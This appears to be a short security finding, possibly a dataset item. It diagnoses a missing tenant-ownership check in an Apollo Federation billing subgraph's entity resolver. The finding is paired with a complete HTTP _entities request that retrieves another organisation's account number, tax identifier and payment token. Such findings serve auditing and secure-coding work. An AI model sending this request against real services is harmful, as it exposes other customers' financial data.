diagnosis: The Apollo Federation subgraph entity resolver __resolveReference resolves BillingAccount directly by reference.id received from the gateway without verifying context.user permissions or asserting that the authenticated tenant owns the requested billing account. Any client querying the federated supergraph or sending an _entities query directly to the subgraph can access arbitrary organization billing accounts and payment tokens.
exploit_request:
POST /graphql HTTP/1.1
Host: billing-subgraph.saas.internal
Content-Type: application/json
Authorization: Bearer <attacker_jwt>

{"query": "query { _entities(representations: [{ __typename: \"BillingAccount\", id: \"bill_corp_99481\" }]) { ... on BillingAccount { accountNumber currentBalance taxIdentifier paymentMethodToken } } }"}
